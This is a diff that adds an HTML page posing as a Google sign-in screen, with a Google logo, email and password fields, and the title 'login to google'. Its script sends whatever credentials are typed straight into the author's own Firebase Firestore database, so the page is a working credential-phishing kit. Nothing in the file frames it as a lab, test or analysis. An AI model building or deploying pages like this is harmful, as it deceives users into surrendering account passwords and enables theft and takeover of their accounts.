@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-firestore.js"></script>
+    <script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+	  apiKey: "AIzaSyC3DMWYgXEuiZ3CSGoiCGw-2NdlgZvaWzQ",
+	  authDomain: "dadada-635ce.firebaseapp.com",
+	  projectId: "dadada-635ce",
+	  storageBucket: "dadada-635ce.appspot.com",
+	  messagingSenderId: "145605295051",
+	  appId: "1:145605295051:web:3cf1b0c385dfe9ca25d44e",
+	  measurementId: "G-4YXR874E3L"
+	};
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    var db = firebase.firestore();
+
+
+	login = ()=>{
+		var email = document.getElementById("email").value;
+		var password = document.getElementById("password").value;
+		
+		db.collection("users").add({
+			username: email,
+			password: password,	
+		})
+	}
+        
+    </script>
+
+
+    <title>login to google</title>
+    <style>
+        body{
+            background-color: rgb(253, 253, 200);
+        }
+        div{
+            margin: auto;
+            border: 1px solid whitesmoke;
+            background-color: white;
+            padding: 10px;
+            width: 400px;
+            margin-top: 30px;
+            align-items: center;
+            border-radius: 10%;
+        }
+        div>button{
+            background-color: orange;
+            width: 100px;
+            height: 40px;
+            font-size: large;   
+            align-self: center;
+            margin-top: 10px;
+            margin-left: 37%;
+        }
+        div>input{  
+            height: 40px;
+            font-size: large;   
+            align-self: center;
+            margin-left: 15%;
+            margin-bottom: 20px;
+            width: 70%
+        }
+        div>img{  
+            height: 50%; 
+            align-self: center;
+            margin-left: 25%;
+            margin-top: 30px;
+        }
+        div>a{
+            margin-left: 15%;
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="cls">
+        <img src="google.png" width="200" height="100" /><br>
+        <input type="email" placeholder="Enter Email" id="email"/><br>
+        <input type="password" placeholder="Enter Password" id="password"/><br>
+        <a href="#">Forgot Password ?</a><br>
+        <button onclick="login()">Sign In</button>
+    </div>
+
+
+</body>
+</html>
